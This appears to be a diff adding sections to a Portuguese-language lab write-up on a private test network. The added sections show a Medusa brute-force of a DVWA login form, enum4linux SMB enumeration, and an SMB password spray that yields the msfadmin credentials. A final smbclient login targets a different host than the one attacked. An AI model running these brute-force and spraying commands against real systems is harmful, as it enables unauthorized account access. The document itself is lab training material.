@@ -73,9 +73,64 @@ Máquina alvo acessada com sucesso.
 
 ---
 ## Ataque em formulário DVWA
+
 Criação de wordlist com os comandos.
 ```bash
 echo -e "user\nadmin\nmsfadmin\nroot" > users.txt
 echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
 echo -e "user\nadmin\nmsfadmin\nroot" > users.txt
 ```
+Utilizando a Medusa para gerar tentativas de senhas e usuários para login, com o comando.
+```bash
+medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http \
+  -m PAGE:/dvwa/login.php \
+  -m FORM:"username=^USER^&password=^PASS^&Login=Login" \
+  -m FAIL:"Login failed" \
+  -t 7
+```
+
+<img width="820" height="130" alt="image" src="https://github.com/user-attachments/assets/2055aab1-1a62-469d-bd52-35350d12b263" />
+
+<img width="886" height="570" alt="image" src="https://github.com/user-attachments/assets/bc3cc17c-32cf-4e79-80e9-55fff6bb8136" />
+
+Senha e usuário capturadas com sucesso.
+
+---
+
+## Ataque de enumeração SMB
+
+Inicia a enumeração de usuário com o comando.
+```bash
+enum4linux -a 192.168.56.101 | tee enum4_output.txt
+```
+<img width="728" height="78" alt="image" src="https://github.com/user-attachments/assets/2ab3dbf2-29fb-419d-a7e0-f767bd2bbe91" />
+
+O comando executa e começa enumeração de usuários, que retorna com os resultados, prosseguimos o ataque com o proximo comando e a criação de wordlist.
+
+<img width="599" height="159" alt="image" src="https://github.com/user-attachments/assets/fbe67e1a-88d3-4478-b4e6-3010668129cd" />
+
+```bash
+echo -e "user\nmsfadmin\nservice" > smb_users.txt
+echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt
+```
+
+Agora inicia o ateque com a Medusa com o comando.
+
+```bash
+medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
+```
+
+<img width="750" height="488" alt="image" src="https://github.com/user-attachments/assets/5712337b-d1a5-4660-ac16-aaddb5b0703a" />
+
+Senha e usuário capturadas com sucesso.
+
+```bash
+ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: msfadmin Password: msfadmin
+```
+Utilizamos a senha e usuário obtidos para o acesso e o seguinte comando.
+
+```bash
+smbclient -L //192.168.56.102 -U msfadmin
+```
+
+<img width="752" height="332" alt="image" src="https://github.com/user-attachments/assets/f29c1d0e-d29b-415c-8703-87bcdbfd1936" />
